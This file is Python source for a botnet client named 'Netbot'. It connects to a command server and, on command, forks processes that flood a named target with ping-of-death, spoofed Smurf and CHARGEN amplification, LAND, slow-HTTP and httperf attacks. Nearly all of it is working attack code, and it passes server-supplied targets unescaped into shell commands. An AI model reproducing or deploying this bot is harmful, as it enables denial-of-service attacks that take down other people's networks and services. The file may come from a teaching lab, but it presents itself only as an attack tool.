import os
import socket
import signal
import sys

pid = None

def signal_handler(sig, frame):
    if pid > 0:
        os.killpg(pid, signal.SIGKILL)
    sys.exit(sig)

def main():
    global pid
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        sys.stderr.write("[ERROR] %s\n" % msg[1])
        sys.exit(1)

    server_address = ("127.0.0.1", 8080)
    sock.connect(server_address)

    message = b'Hello'
    sock.sendall(message)
    print("[INFO] Netbot connected to the server successfully!")

    signal.signal(signal.SIGINT, signal_handler)

    while True:
        data = sock.recv(1024)
        if data == b'':
            sock.close()
            os.killpg(pid, signal.SIGKILL)
            sys.exit(0)

        if data[:4] == b'HALT':
            os.killpg(pid, signal.SIGKILL)
            print(f"[INFO] Killing the process group with PID {pid}")
            os.system("clear")
            print(f"Attack halted. Waiting for Server's command...")
            continue

        if pid > 0:
            os.killpg(pid, signal.SIGKILL)

        pid = os.fork()
        if pid == 0:
            os.setpgid(os.getpid(), os.getpid())
            seglist = data.decode().split('_')

            if seglist[0][:3] == 'POD':
                cmd = f"ping {seglist[1]} -s 65000 -i 0.000000001"
            elif seglist[0][:5] == 'SMURF':
                cmd = f"hping3 10.0.2.255 -a {seglist[1]} --icmp -C 8 -D --flood"
            elif seglist[0][:7] == 'CHARGEN':
                cmd = f"hping3 10.0.2.255 -a {seglist[1]} -p 19 --udp -D --flood"
            elif seglist[0][:4] == 'LAND':
                cmd = f"for i in {{1..100000}}; do hping3 {seglist[1]} -a {seglist[1]} -p 7 -s 7 -S -c 1 -D --flood; sleep 0.00000000000001; done;"
            elif seglist[0][:8] == 'SLOWHTTP':
                cmd = f"lowhttptest -H -u http://{seglist[1]} -t GET -c 500 -r 30 -p 20 -l 3600"
            elif seglist[0][:8] == 'FASTHTTP':
                cmd = f"httperf --server {seglist[1]} --uri / --num-conns 100000 --rate 500"

            os.system(cmd)

        return
    
if __name__ == '__main__':
    main()





            

        

    